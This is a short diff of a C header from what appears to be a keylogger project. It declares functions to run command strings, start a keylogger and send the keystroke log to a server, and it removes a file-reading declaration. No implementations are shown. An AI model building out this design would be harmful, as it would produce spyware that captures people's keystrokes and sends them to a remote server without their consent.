@@ -40,9 +40,6 @@ struct command {
 // exec_cmd.c
 int exec_str_as_command(char *user_cmd, bool catch_stds);	// Execute a command string in user mode
 
-// file_ops.c
-char *read_file(char *filename, int *readed_size);			// Read the content of a file into a dynamically allocated buffer
-
 // epikeylog.c
 int epikeylog_init(int keylog_mode);						// Initialize the keylogger
 int epikeylog_send_to_server(void);							// Send keylogger content to the server
